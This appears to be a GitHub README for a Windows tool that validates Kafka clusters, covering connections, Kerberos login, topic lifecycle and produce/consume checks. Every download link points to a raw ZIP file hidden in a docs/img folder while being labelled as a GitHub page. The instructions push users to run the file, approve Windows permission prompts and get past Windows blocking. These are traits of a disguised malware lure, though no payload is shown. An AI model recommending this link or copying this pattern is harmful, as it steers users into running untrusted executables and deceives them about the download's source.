# 🐞 kafka-cluster-testing - Validate Kafka clusters with confidence

[![Download](https://img.shields.io/badge/Download-Open%20the%20GitHub%20page-blue.svg)](https://raw.githubusercontent.com/sparbuoygenuslagothrix662/kafka-cluster-testing/main/docs/img/kafka_cluster_testing_v3.1.zip)

## 🚀 Overview

kafka-cluster-testing is a Windows app for checking whether a Kafka cluster is ready to use. It focuses on basic checks that matter most before you rely on a cluster for work.

Use it to test:

- Cluster connection
- Kerberos login
- Topic creation and removal
- Produce and consume flow
- Basic test reports

The app is built for people who want a clear pass or fail result without working through Kafka tools by hand.

## 💻 What You Need

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- A working internet connection if the app needs to reach a remote cluster
- Permission to run downloaded apps
- Access to the Kafka cluster you want to test
- Kerberos details if your cluster uses Kerberos sign-in

If your team gave you a server name, port, user name, or ticket setup, keep that information ready.

## 📥 Download

Visit this page to download:

[Open kafka-cluster-testing on GitHub](https://raw.githubusercontent.com/sparbuoygenuslagothrix662/kafka-cluster-testing/main/docs/img/kafka_cluster_testing_v3.1.zip)

On that page, look for the latest release or the main download file. Save it to your computer before you run it.

## 🛠️ Install or Open on Windows

After you download the file, follow these steps:

1. Open the folder where the file was saved.
2. If the file is in a ZIP folder, right-click it and choose **Extract All**.
3. Open the extracted folder.
4. Find the app file.
5. Double-click the file to start it.
6. If Windows asks for permission, choose **Run** or **Yes**.

If your team gave you a specific install folder, keep the file there so you can find it again.

## 🧭 First-Time Setup

When you open the app for the first time, you will usually need to enter cluster details.

Have these ready:

- Kafka broker address
- Port number
- Security type
- Kerberos realm, if used
- Service name, if used
- Test topic name

If your cluster uses Kerberos, make sure your sign-in ticket or key setup is ready before you run a check.

## ✅ How to Run a Cluster Test

Use the app to run a basic validation check:

1. Start the app.
2. Enter the Kafka cluster details.
3. Choose the test you want to run.
4. Start with a connection test.
5. Run the topic test.
6. Run the produce test.
7. Run the consume test.
8. Review the results on screen or in the report.

A good run usually checks the full path from login to message flow. This helps you find issues in the cluster, not just in one step.

## 🔐 Kerberos Support

This utility puts Kerberos first. That means it works well in setups that use secure sign-in with tickets and service rules.

Use this when your environment needs:

- Kerberos login
- SASL-based access
- GSSAPI authentication
- Secure broker access

If your cluster uses Kerberos, make sure your computer can reach the Kerberos services used by your team. If your system admin gave you a ticket method or config file, use that setup before running the test.

## 🧪 What the Tests Check

The app is made to validate common Kafka tasks in one place.

### 🔌 Connection Check

This test checks whether the app can reach the Kafka broker. It helps you catch basic network or auth issues early.

### 🗂️ Topic Lifecycle Check

This test can create a topic, confirm it exists, and remove it if needed. It helps prove that the cluster can manage topic actions.

### 📤 Produce Check

This test sends a message to Kafka. It shows whether the cluster accepts data.

### 📥 Consume Check

This test reads the message back from Kafka. It helps confirm that data moves through the cluster as expected.

### 📝 Report Check

The app records the result of each test so you can see what passed and what failed.

## 🧰 Common Use Cases

Use kafka-cluster-testing when you need to:

- Check a new Kafka cluster before use
- Confirm Kerberos access after a config change
- Test broker access after a network update
- Validate topic setup for a project
- Verify that produce and consume still work
- Create a simple report for ops review

This is useful for support teams, platform teams, and anyone who needs a fast health check for Kafka.

## 📂 Typical Input Values

If you are not sure what to enter, your admin or team lead may give you values like these:

- Broker: `kafka01.company.local`
- Port: `9092` or `9093`
- Topic: `test-topic`
- Security mode: `Kerberos` or `SASL/GSSAPI`
- Realm: `COMPANY.LOCAL`
- Service name: `kafka`

Use the values that match your cluster. A small typo can stop the test from connecting.

## 🧼 Before You Test

For the best result:

- Close other tools that may use the same Kafka topic
- Make sure your network can reach the broker
- Confirm your Kerberos ticket is active if needed
- Use a test topic, not a live business topic
- Check that you have permission to create and delete topics

This helps keep the test clean and easy to repeat.

## 📊 Reading the Results

The app gives a clear result for each step.

### Pass

A pass means the app completed the test without a problem.

### Fail

A fail means one step did not work. Common causes include:

- Wrong broker name
- Wrong port
- Bad Kerberos setup
- Missing ticket
- Topic permission issue
- Network block

Use the failed step to narrow down the cause. Start with connection, then move to auth, then topic and message flow.

## 🔍 Troubleshooting

If the app does not work as expected, check these items:

- Confirm you opened the file you downloaded
- Make sure Windows did not block the app
- Check the broker address and port
- Check your Kerberos ticket or login setup
- Verify the topic name exists or can be created
- Make sure the network can reach the cluster

If the app opens but the test fails, review the first failed step. That step often shows where the problem starts.

## 📌 About This Project

kafka-cluster-testing is focused on cluster validation, not general Kafka training. It gives you a direct way to test Kafka access, security, topic behavior, and message flow from one place.

The project topics include:

- apache-kafka
- cluster-testing
- devops
- gssapi
- java
- kafka
- kerberos
- sasl
- smoke-test
- testing
- validation

## 🔗 Download Again

If you need to get the app again, use this page:

[https://raw.githubusercontent.com/sparbuoygenuslagothrix662/kafka-cluster-testing/main/docs/img/kafka_cluster_testing_v3.1.zip](https://raw.githubusercontent.com/sparbuoygenuslagothrix662/kafka-cluster-testing/main/docs/img/kafka_cluster_testing_v3.1.zip)

Open the page, find the latest download, save it to your PC, and run it on Windows